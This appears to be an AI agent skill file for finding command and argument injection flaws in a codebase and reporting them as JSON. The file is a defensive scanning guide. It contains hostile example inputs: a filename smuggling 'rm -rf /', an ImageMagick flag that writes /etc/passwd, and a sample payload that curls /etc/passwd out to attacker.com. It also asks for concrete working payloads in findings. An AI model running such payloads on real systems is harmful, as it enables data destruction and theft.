Hunt a codebase for OS command injection and argument injection vulnerabilities — from user-controlled input through shell execution, subprocess calls, and template-rendered commands. Trace data flow to the shell. Write structured findings to cmdi-findings.json.

Do NOT flag every `subprocess.run()` call. Trace whether attacker-controlled input reaches the call, whether shell=True is used, and whether arguments are properly separated. A subprocess call with a fixed command list and no user input in arguments is safe.

## Background: Why This Skill Exists

Novee found a CRITICAL OS command injection in Foxit PDF SDK's Signature Server — a file processing pipeline where user-supplied content reached a shell command. Standard SAST flags `shell=True` everywhere, creating noise. This skill reasons: is attacker input reaching this call? Can they break out of argument boundaries?

## Input

`$ARGUMENTS` format: `[--repo <path>] [--lang <python|go|java|node>]`

- `--repo <path>` — repo root (default: current directory)
- `--lang <name>` — auto-detected if omitted

## Step 1 — Map Execution Sinks

Glob for execution sinks by language:

**Python:** `subprocess.run`, `subprocess.Popen`, `subprocess.call`, `subprocess.check_output`, `os.system`, `os.popen`, `os.execv`, `eval(`, `exec(`, `commands.getoutput`
**Go:** `exec.Command`, `exec.CommandContext`, `syscall.Exec`
**Java:** `Runtime.exec`, `ProcessBuilder`, `ScriptEngine.eval`
**Node:** `child_process.exec`, `child_process.execSync`, `child_process.spawn`, `eval(`, `new Function(`, `vm.runInNewContext`
**Generic:** `shell_exec`, `passthru`, `system(` (PHP), `` `backtick` `` (Ruby/Perl)

Also glob for template engines that render to shell commands:
- Jinja2/Django templates rendered to command strings
- String formatting: `f"cmd {user_input}"`, `"cmd %s" % user_input`, `"cmd " + user_input`

## Step 2 — The 4 Command Injection Classes

---

### Class 1 — Direct Shell Injection (CWE-78)

User input concatenated into a shell command string when `shell=True`.

**Python example:**
```python
subprocess.run(f"convert {filename} output.pdf", shell=True)
```
If `filename` is `"; rm -rf /; echo "`, the shell executes all three commands.

**SOURCES (attacker-controlled):**
- HTTP request parameters, headers, body fields
- File names / metadata from uploaded files
- User-provided display names, paths, identifiers
- Environment variables set from user input
- Data read from user-uploaded files (metadata fields in PDF, EXIF in image, filename in archive)

**SHELL=TRUE IS THE KEY RISK MULTIPLIER:**
- `subprocess.run(cmd, shell=True)` — the entire string is passed to `/bin/sh -c`
- `subprocess.run(cmd_list, shell=False)` — safe even with user input in arguments (no shell interpretation)
- `os.system(cmd)` — always shell=True equivalent

**Sanitization (genuine):**
- `shlex.quote(user_input)` wrapping each argument before interpolation
- Never using `shell=True` — using list-form subprocess instead
- Allowlist validation rejecting anything except known-safe characters

**Sanitization (insufficient):**
- Removing only `; | &` — misses `$()`, backticks, newlines, `\n`, unicode separators
- Escaping only quotes — misses `$()` command substitution
- Checking input against a regex that doesn't cover all shell metacharacters

**For each `shell=True` or `os.system` found:**
1. Trace every variable in the command string — where does it come from?
2. If any variable traces to user input: is it wrapped with `shlex.quote` or equivalent?
3. Could an attacker inject `;`, `|`, `&&`, `||`, `$()`, backticks, or newline into that variable?

---

### Class 2 — Argument Injection (CWE-88)

Even without `shell=True`, if user input is inserted as an argument to a trusted tool, the tool may interpret it as a flag.

**Example:**
```python
subprocess.run(["convert", user_filename, "output.pdf"])
```
If `user_filename` is `-write /etc/passwd`, ImageMagick writes to `/etc/passwd`.

**High-risk tools for argument injection:**
- `curl` — `-o` writes output, `-x` sets proxy, `--config` reads from file
- `wget` — `--output-document`, `--post-file`
- `git` — `--upload-pack`, `--exec`, hook execution via path
- `ssh` — `-o ProxyCommand=...` enables command execution
- `ffmpeg`, `ImageMagick convert` — numerous write/exec flags
- `rsync` — `--rsh`, `--rsync-path`
- `find` — `-exec` runs commands
- Any tool that accepts `--config`, `--exec`, `--run`, `-e`

**Sanitization (genuine):**
- Using `--` separator before user-supplied arguments: `["convert", "--", user_filename, "output.pdf"]`
- Validating argument starts with expected prefix (e.g., must be a filename with no dashes)
- Allowlist of permitted filenames/values

**For each subprocess call with user input in arguments:**
1. What tool is being called?
2. Does the user input appear as a positional argument that could be interpreted as a flag?
3. Is `--` used to separate options from operands?
4. Could the user supply `-flag value` to inject a dangerous option?

---

### Class 3 — Code Evaluation Injection (CWE-94)

User input passed to `eval()`, `exec()`, `Function()`, or template engines that execute code.

**Python:**
```python
eval(user_expression)
exec(f"result = {user_code}")
```

**JavaScript:**
```javascript
eval(userInput)
new Function("return " + userInput)()
```

**Template engines rendering to code:**
- Jinja2 `{{ user_input | e }}` in a template that's later `eval()`d
- Python `compile()` + `exec()` on user-supplied source
- Expression evaluators using `ast.literal_eval` are SAFE; `eval()` is not

**For each `eval` / `exec` / `new Function` found:**
1. Does any argument contain user-controlled data?
2. Is `ast.literal_eval` used instead of `eval` (safe for literals)?
3. Is the sandbox adequate if a custom evaluator is used?

---

### Class 4 — File Processing Pipeline Injection (Novee's Foxit Pattern)

File processing tools (PDF signing, image conversion, document rendering) that construct shell commands from file metadata are the most common source of high-severity command injection CVEs in production software.

**Pattern:**
1. User uploads a file
2. Server extracts metadata (filename, author, title, EXIF, embedded strings)
3. Metadata is interpolated into a command string
4. Command is executed with `shell=True`

**High-risk metadata sources:**
- PDF metadata fields: title, author, creator, subject
- Image EXIF: GPS coordinates, camera model, copyright
- Archive filenames: ZIP, TAR entries with special characters
- Office document properties
- Font names in PDF/SVG
- JavaScript in PDF forms

**For each file processing pipeline:**
1. Does the code extract metadata from the uploaded file?
2. Is that metadata used in a subprocess call — directly or after formatting?
3. Is `shell=True` used in this pipeline?
4. Is the metadata sanitized with `shlex.quote` before interpolation?

---

## Step 3 — Build the Scan Queue

Priority order:
1. Files with `shell=True` or `os.system`
2. Files with `subprocess` / `exec.Command` / `Runtime.exec` calls
3. Files with `eval` / `exec` / `new Function`
4. Files in file upload / processing pipelines
5. Files that extract metadata from uploaded content

## Step 4 — Analyze Each File

Read the full file. Apply relevant class analysis.

**For every execution sink:**
> Q1: Is `shell=True` used, or is it a list-form call?
> Q2: Trace every variable in the command/argument list — where does each originate?
> Q3: If user-supplied: is it sanitized with shell escaping (`shlex.quote`) or used as-is?
> Q4: If list-form: could user input be a flag/option for the tool being called?

**For file processing pipelines:**
> Q1: What file formats are accepted? Which contain metadata?
> Q2: Is metadata extracted and used in downstream commands?
> Q3: Is `shell=True` used anywhere in the pipeline?

## Step 5 — Score and Filter

**Confidence:**
- **0.90–1.00** — `shell=True` with user input directly in the command string, no sanitization
- **0.70–0.89** — `shell=True` with user input through one intermediate variable
- **0.50–0.69** — Argument injection with dangerous tool; or indirect path through metadata
- **< 0.50** — Discard

**Number:** `CI-001`, `CI-002`, ...

**Severity:**

| Severity | Criteria |
|---|---|
| Critical | `shell=True` with unsanitized user input reachable by any user |
| High | `shell=True` via file metadata; argument injection with code-exec capable tool |
| Medium | Argument injection with limited-impact tool; `eval` with sanitized input |
| Low | Eval of numeric expression; argument injection with no dangerous flags available |

## Step 6 — Write cmdi-findings.json

```json
{
  "scanned_at": "<ISO 8601 timestamp>",
  "repo_path": "<absolute path>",
  "total_findings": 0,
  "findings_by_severity": { "critical": 0, "high": 0, "medium": 0, "low": 0 },
  "findings": [
    {
      "id": "CI-001",
      "class": "shell-injection | argument-injection | code-eval | file-pipeline",
      "cwe": "CWE-78",
      "severity": "critical | high | medium | low",
      "confidence": 0.95,
      "confidence_note": "",
      "file": "app/services/pdf_signer.py",
      "line": 47,
      "function": "sign_document",
      "source": "filename — from HTTP multipart upload, user-controlled",
      "sink": "subprocess.run(f'signpdf {filename} -out signed.pdf', shell=True)",
      "sanitization_present": "None — filename used directly in f-string",
      "shell_true": true,
      "payload_example": "malicious.pdf; curl http://attacker.com/$(cat /etc/passwd) #",
      "description": "User-supplied filename is interpolated into a shell command with shell=True. An attacker can inject shell metacharacters to execute arbitrary OS commands.",
      "fix_hint": "Use list form: subprocess.run(['signpdf', filename, '-out', 'signed.pdf']). Never use shell=True with user input."
    }
  ],
  "skipped_files": [],
  "warnings": []
}
```

## Hard Rules

- A `subprocess.run(["cmd", var], shell=False)` call is NOT a finding even if `var` is user-controlled, unless argument injection is possible for that specific tool.
- `payload_example` must be a concrete working payload for the specific sink — not just `; rm -rf /`.
- Do not flag `eval()` of hardcoded strings or `ast.literal_eval()`.
- Do not flag `os.path.join` here — that belongs in `/path-traversal`.

## Completion

```
cmd-injection complete.
  Repo          : <repo_path>
  Lang          : <language>
  Files scanned : <N>
  Findings      : <total> (<critical> critical / <high> high / <medium> medium / <low> low)
  Output        : cmdi-findings.json
```
